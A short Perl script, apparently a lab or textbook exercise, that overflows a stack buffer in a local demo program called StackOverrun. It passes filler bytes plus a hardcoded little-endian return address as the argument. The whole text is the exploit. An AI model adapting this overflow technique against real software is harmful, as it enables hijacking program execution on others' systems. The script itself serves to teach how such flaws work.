
use warnings FATAL => 'all';
use strict;

my $sled = "zzzzzz";

my $ arg =  "zzzzzzzzzzzzzzzz"."\x7F\x11\x40\x00"; 
my $cmd = "./StackOverrun ".$arg;

system($cmd);